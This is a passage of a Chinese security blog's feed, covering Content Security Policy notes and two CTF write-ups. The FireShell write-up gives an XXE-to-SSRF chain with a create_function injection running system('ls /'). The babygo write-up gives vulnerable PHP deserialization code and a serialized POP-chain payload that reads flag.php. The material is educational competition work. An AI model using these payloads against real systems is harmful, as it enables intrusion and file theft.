class="headerlink" title="精确控制"></a>精确控制</h2><p>其他可以设置的源有：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/child-src" target="_blank" rel="noopener"><code>child-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src" target="_blank" rel="noopener"><code>connect-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/font-src" target="_blank" rel="noopener"><code>font-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src" target="_blank" rel="noopener"><code>frame-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/img-src" target="_blank" rel="noopener"><code>img-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/manifest-src" target="_blank" rel="noopener"><code>manifest-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/media-src" target="_blank" rel="noopener"><code>media-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/object-src" target="_blank" rel="noopener"><code>object-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/script-src" target="_blank" rel="noopener"><code>script-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/style-src" target="_blank" rel="noopener"><code>style-src</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/worker-src" target="_blank" rel="noopener"><code>worker-src</code></a></li><li><code>sandbox allow-forms allow-scripts</code>：授权一个沙箱来请求iframe sanbox等类似属性的资源，沙箱默认使用同源策略，可增加配置，如<code>allow-scripts</code>，允许跨站script</li></ul><p>例如，信任任意的图片来源，但是只信任本站的其他来源：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; img-src *</span><br></pre></td></tr></table></figure><h2 id="内嵌脚本"><a href="#内嵌脚本" class="headerlink" title="内嵌脚本"></a>内嵌脚本</h2><p>新版的默认策略已经封禁了内嵌脚本的执行，这意味着即使我们不引入外部js，而直接在<code>&lt;script&gt;</code>标签里面写东西也是不允许的（这也造成<a href="https://www.anquanke.com/post/id/151496#h2-4" target="_blank" rel="noopener">巧妙地绕过CSP：欺骗CSP执行任意代码</a>一文的失效：</p><p><img src="/HTTP-内容安全策略CSP学习笔记/1548837928332.png" alt="1548837928332"></p><p>那么正常的需求怎么办呢？正常服务器发送网页的时候，需要在策略中告诉浏览器一个随机生成的token。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'</span><br></pre></td></tr></table></figure><p>页面内嵌脚本必须有这个token才能执行：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">EDNnf03nceIOfn39fn3e9h3sdfa</span>&gt;</span><span class="javascript"> <span class="comment">// some code </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="测试策略"><a href="#测试策略" class="headerlink" title="测试策略"></a>测试策略</h1><p>可以将CSP配置为仅报告模式，这样即使出现违规，CSP也只是报告这个行为而不强制拦截：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy-Report-Only</span>: default-src 'self'; report-uri http://127.0.0.1:8000</span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1:8000收到的报告如下：" target="_blank" rel="noopener">http://127.0.0.1:8000收到的报告如下：</a></p><p><img src="/HTTP-内容安全策略CSP学习笔记/1548838217202.png" alt="1548838217202"></p><h1 id="其他关键字"><a href="#其他关键字" class="headerlink" title="其他关键字"></a>其他关键字</h1><h1 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h1><p>毫无疑问很多浏览器是不支持这个字段的，详细的支持参见<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>内容安全策略( CSP )，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></li><li>巧妙地绕过CSP：欺骗CSP执行任意代码，<a href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa" target="_blank" rel="noopener">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全-HTTP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> CSP </tag>
            
            <tag> 协议安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019fireshell一道从XXE到SSRF题</title>
      <link href="/ctf-2019fireshell%E4%B8%80%E9%81%93%E4%BB%8Exxe%E5%88%B0ssrf%E9%A2%98/"/>
      <url>/ctf-2019fireshell%E4%B8%80%E9%81%93%E4%BB%8Exxe%E5%88%B0ssrf%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><strong>题目:</strong> BadInjection, 其他题解请参考白帽100公众号的<a href="https://mp.weixin.qq.com/s/LzyKtwmqq5HO6meUqq7aug" target="_blank" rel="noopener">FireShell CTF 2019 WriteUp</a>.</p><h1 id="0x01任意文件下载"><a href="#0x01任意文件下载" class="headerlink" title="0x01任意文件下载"></a>0x01任意文件下载</h1><p>file参数存在文件下载，顺藤摸瓜依次下载到index.php，Routers.php，Custom.php，Admin.php。</p><a id="more"></a><h1 id="0x02XXE"><a href="#0x02XXE" class="headerlink" title="0x02XXE"></a>0x02XXE</h1><p>查看Custom.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Custom</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">Test</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">      $root = simplexml_load_string($string,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line">      $test = $root-&gt;name;</span><br><span class="line">      <span class="keyword">echo</span> $test;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其存在XXE:</p><p><img src="/ctf-2019fireshell一道从xxe到ssrf题/1548596007409.png" alt="1548596007409"></p><h1 id="0x03代码执行"><a href="#0x03代码执行" class="headerlink" title="0x03代码执行"></a>0x03代码执行</h1><p>接着再看Admin.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sort</span><span class="params">($url,$order)</span></span>&#123;</span><br><span class="line">    $uri = parse_url($url);</span><br><span class="line">    $file = file_get_contents($url);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($file,LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $xml = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">if</span>($xml)&#123;</span><br><span class="line">     <span class="comment">//echo count($xml-&gt;channel-&gt;item);</span></span><br><span class="line">     <span class="comment">//var_dump($xml-&gt;channel-&gt;item-&gt;link);</span></span><br><span class="line">     $data = [];</span><br><span class="line">     <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($xml-&gt;channel-&gt;item);$i++)&#123;</span><br><span class="line">       <span class="comment">//echo $uri['scheme'].$uri['host'].$xml-&gt;channel-&gt;item[$i]-&gt;link."\n";</span></span><br><span class="line">       $data[] = <span class="keyword">new</span> Url($i,$uri[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$uri[<span class="string">'host'</span>].$xml-&gt;channel-&gt;item[$i]-&gt;link);</span><br><span class="line">       <span class="comment">//$data[$i] = $uri['scheme'].$uri['host'].$xml-&gt;channel-&gt;item[$i]-&gt;link;</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">//var_dump($data);</span></span><br><span class="line">     usort($data, create_function(<span class="string">'$a, $b'</span>, <span class="string">'return strcmp($a-&gt;'</span>.$order.<span class="string">',$b-&gt;'</span>.$order.<span class="string">');'</span>));</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'&lt;div class="ui list"&gt;'</span>;</span><br><span class="line">     <span class="keyword">foreach</span>($data <span class="keyword">as</span> $dt) &#123;</span><br><span class="line"></span><br><span class="line">       $html = <span class="string">'&lt;div class="item"&gt;'</span>;</span><br><span class="line">       $html .= <span class="string">''</span>.$dt-&gt;id.<span class="string">' - '</span>;</span><br><span class="line">       $html .= <span class="string">' &lt;a href="'</span>.$dt-&gt;link.<span class="string">'"&gt;'</span>.$dt-&gt;link.<span class="string">'&lt;/a&gt;'</span>;</span><br><span class="line">       $html .= <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     $html .= <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">     <span class="keyword">echo</span> $html;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>Lz1y师傅提示create_function存在代码执行，前面url给一个rss的订阅源，后面的$order就是注入点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin?rss=http://anemone.top/atom.xml&amp;order=link);&#125;system(&quot;ls /&quot;);//</span><br></pre></td></tr></table></figure><h1 id="0x04SSRF"><a href="#0x04SSRF" class="headerlink" title="0x04SSRF"></a>0x04SSRF</h1><p>从Routers.php可以知道admin.php只能localhost访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Route::set(<span class="string">'admin'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>($_REQUEST[<span class="string">'rss'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_REQUES[<span class="string">'order'</span>]))&#123;</span><br><span class="line">    Admin::createView(<span class="string">'Admin'</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span> || $_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'::1'</span>)&#123;</span><br><span class="line">      Admin::sort($_REQUEST[<span class="string">'rss'</span>],$_REQUEST[<span class="string">'order'</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">";("</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>只能用xxe打内网了order字段需要url编码:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://localhost/admin?rss=http://anemone.top/atom.xml&amp;order=%6c%69%6e%6b%29%3b%7d%73%79%73%74%65%6d%28%22%6c%73%22%29%3b%2f%2f"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>列出目录成功：<img src="/ctf-2019fireshell一道从xxe到ssrf题/ls.png" alt="ls"></p><p>得到flag：</p><p><img src="/ctf-2019fireshell一道从xxe到ssrf题/flag.png" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web安全 </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019安恒01月赛babygo（详解）和其他题目wp</title>
      <link href="/ctf-2019%E5%AE%89%E6%81%9201%E6%9C%88%E8%B5%9Bbabygo%EF%BC%88%E8%AF%A6%E8%A7%A3%EF%BC%89%E5%92%8C%E5%85%B6%E4%BB%96%E9%A2%98%E7%9B%AEwp/"/>
      <url>/ctf-2019%E5%AE%89%E6%81%9201%E6%9C%88%E8%B5%9Bbabygo%EF%BC%88%E8%AF%A6%E8%A7%A3%EF%BC%89%E5%92%8C%E5%85%B6%E4%BB%96%E9%A2%98%E7%9B%AEwp/</url>
      
        <content type="html"><![CDATA[<p>今天碰上事情，加上自己又菜，只做出两题。</p><h1 id="web-babygo"><a href="#web-babygo" class="headerlink" title="web-babygo"></a>web-babygo</h1><p>题目给出了源代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $skyobj;</span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $nice; <span class="comment">//baby object</span></span><br><span class="line">    <span class="keyword">public</span> $amzing;  <span class="comment">//baby object serialized</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">echo</span> $sth;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]); <span class="comment">//baby object</span></span><br><span class="line">    <span class="keyword">echo</span> $Input_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>可以看到存在反序列化漏洞，构造的POP链为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">baby.__toString()</span><br><span class="line">-&gt;cool.read()</span><br></pre></td></tr></table></figure><p>注意到baby的$skyobj为protected变量，因此没法先实例化再赋值，只能改__constract()方法，将其设为cool的实例，然后将对象序列化，因为php弱类型，所以反序列化可以成功。通过如下代码生成payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $skyobj;</span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $c=<span class="keyword">new</span> cool();</span><br><span class="line">        $c-&gt;filename=<span class="string">"flag.php"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = $c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $nice; <span class="comment">//baby object</span></span><br><span class="line">    <span class="keyword">public</span> $amzing;  <span class="comment">//baby object serialized</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $bb_ser;</span></span><br><span class="line">$b=<span class="keyword">new</span> baby();</span><br><span class="line">$b_ser=serialize($b);</span><br><span class="line"><span class="keyword">echo</span> $b_ser;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test:</span></span><br><span class="line">$Input_data = unserialize($b_ser); <span class="comment">//baby object</span></span><br><span class="line"><span class="keyword">echo</span> $Input_data;</span><br></pre></td></tr></table></figure><p>得到payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"baby"</span>:<span class="number">3</span>:&#123;s:<span class="number">9</span>:<span class="string">"%00*%00skyobj"</span>;O:<span class="number">4</span>:<span class="string">"cool"</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">"filename"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;s:<span class="number">4</span>:<span class="string">"nice"</span>;N;s:<span class="number">6</span>:<span class="string">"amzing"</span>;N;&#125;s:<span class="number">3</span>:<span class="string">"aaa"</span>;N;s:<span class="number">3</span>:<span class="string">"bbb"</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>原先我以为cool里面还要再生成一个baby对象绕过<code>if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</code>，但直接将上面的payload作为get的data发过去就能拿到flag了，原因是<code>$this-&gt;nice = unserialize($this-&gt;amzing);</code>执行后<code>$nice=bool(false)</code>，此时<code>$this-&gt;nice-&gt;aaa=$this-&gt;nice-&gt;bbb=NULL</code>，因为<code>$sth</code>变量没有定义（实际上在<code>flag.php</code>中<code>$sth</code>是定义的，但是在类中不能直接用——需要global声明），因此即使执行<code>$this-&gt;nice-&gt;aaa = $sth;</code>，<code>$this-&gt;nice-&gt;aaa</code>仍为空，因此if判断是通过的。</p><p><img src="/ctf-2019安恒01月赛babygo（详解）和其他题目wp/TIM截图20190126112049.png" alt="TIM截图20190126112049"></p><h2 id="正确解法"><a href="#正确解法" class="headerlink" title="正确解法"></a>正确解法</h2><p>如果在类中确实使用了global声明，那么需要用指针使bbb随aaa动态改变（这应该是出题人本来的意思，感谢飘零大佬的wp)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$b=<span class="keyword">new</span> baby();</span><br><span class="line">$b-&gt;bbb=&amp;$b-&gt;aaa;</span><br></pre></td></tr></table></figure><p>现在梳理一下我们的对象关系：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$baby_outside-&gt;skyobj=$cool_obj</span><br><span class="line">$cool_obj-&gt;amzing=serialize($baby_inside)</span><br><span class="line">$baby_inside-&gt;bbb=&amp;$baby_inside-&gt;aaa</span><br></pre></td></tr></table></figure><p>这样因为最内部的baby-&gt;skyobj不能为cool对象，不然就循环调用了，因此要处理一下构造函数，payload产生代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 